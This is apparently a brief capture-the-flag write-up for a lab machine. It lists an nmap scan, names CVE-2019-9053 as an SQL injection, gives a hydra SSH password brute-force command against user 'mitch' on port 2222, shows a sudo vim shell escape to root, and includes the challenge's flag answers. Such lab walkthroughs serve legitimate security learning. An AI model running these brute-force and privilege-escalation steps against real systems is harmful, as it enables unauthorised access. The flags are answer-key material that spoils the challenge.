# How many services are running under port 1000?
`nmap -sV -oN initial IP`

# What is running on the higher port?
ssh

# CVE
cve-2019-9053

# kind of vulnerability
sql-injection

# password
remember to specify the 2222 port for ssh  
`hydra -l mitch -P /usr/share/wordlists/rockyou.txt -s 2222 IP -t 4 ssh`  
<details>
secret
<summary>password</summary>
</details>

# where can you login
ssh

# user flag

<details>
G00d j0b, keep up!
<summary>user.txt</summary>
</details>

# other users
`ls /home`

# priveleged shell
`sudo -l` --> vim  
`sudo vim script.sh` --> `:!sh`  

# root flag
`cat /root/root.txt`
<details>
W3ll d0n3. You made it!
<summary>root.txt</summary>
</details>
